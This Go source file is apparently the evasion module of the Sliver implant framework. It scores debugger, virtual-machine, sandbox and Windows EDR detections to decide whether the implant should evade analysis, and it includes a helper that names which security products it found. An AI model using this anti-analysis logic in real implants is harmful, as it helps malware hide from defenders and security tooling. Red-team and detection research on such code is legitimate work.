package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"strings"
)

// DetectionResult - Comprehensive detection results from all checks
type DetectionResult struct {
	DebuggerDetected bool
	VMDetected       bool
	SandboxDetected  bool
	EDRProducts      []string // Windows only
	Confidence       float32  // 0.0 to 1.0
	ShouldEvade      bool
	DetectedBy       []string // List of what triggered detection
}

// RunAllDetections - Run all platform-appropriate detection checks
// This is the main entry point for evasion checks
// Returns comprehensive detection results
func RunAllDetections() *DetectionResult {
	//{{if .Config.Debug}}
	log.Println("Running comprehensive evasion detection checks...")
	//{{end}}

	result := &DetectionResult{
		DebuggerDetected: false,
		VMDetected:       false,
		SandboxDetected:  false,
		EDRProducts:      []string{},
		Confidence:       0.0,
		ShouldEvade:      false,
		DetectedBy:       []string{},
	}

	// Run platform-specific checks
	if DetectDebugger() {
		result.DebuggerDetected = true
		result.DetectedBy = append(result.DetectedBy, "Debugger")
		result.Confidence += 0.4
	}

	if DetectVM() {
		result.VMDetected = true
		result.DetectedBy = append(result.DetectedBy, "VirtualMachine")
		result.Confidence += 0.3
	}

	if DetectSandbox() {
		result.SandboxDetected = true
		result.DetectedBy = append(result.DetectedBy, "Sandbox")
		result.Confidence += 0.3
	}

	// Platform-specific checks (Windows only)
	//{{if eq .Config.GOOS "windows"}}
	edrProducts := DetectEDRProducts()
	if len(edrProducts) > 0 {
		result.EDRProducts = edrProducts
		result.DetectedBy = append(result.DetectedBy, "EDR")
		result.Confidence += 0.2
	}

	if DetectSuspiciousTiming() {
		result.DetectedBy = append(result.DetectedBy, "SuspiciousTiming")
		result.Confidence += 0.2
	}
	//{{end}}

	// Cap confidence at 1.0
	if result.Confidence > 1.0 {
		result.Confidence = 1.0
	}

	// Determine if we should evade
	// Evade if confidence > 30% OR any critical detection triggered
	result.ShouldEvade = result.Confidence > 0.3 ||
		result.DebuggerDetected ||
		len(result.DetectedBy) > 2

	//{{if .Config.Debug}}
	log.Printf("Detection results: Confidence=%.2f, ShouldEvade=%v, DetectedBy=%v\n",
		result.Confidence, result.ShouldEvade, result.DetectedBy)
	//{{end}}

	return result
}

// IsAnalysisEnvironment - Quick check if running in analysis environment
// Returns true if any analysis indicators detected
func IsAnalysisEnvironment() bool {
	return DetectDebugger() || DetectVM() || DetectSandbox()
}

// GetEnvironmentProfile - Get detailed environment profile
// Returns string description of detected environment
func GetEnvironmentProfile() string {
	result := RunAllDetections()

	if !result.ShouldEvade {
		return "Clean"
	}

	profile := "Suspicious: "
	profile += strings.Join(result.DetectedBy, ", ")

	//{{if eq .Config.GOOS "windows"}}
	if len(result.EDRProducts) > 0 {
		profile += " | EDR: " + strings.Join(result.EDRProducts, ", ")
	}
	//{{end}}

	return profile
}
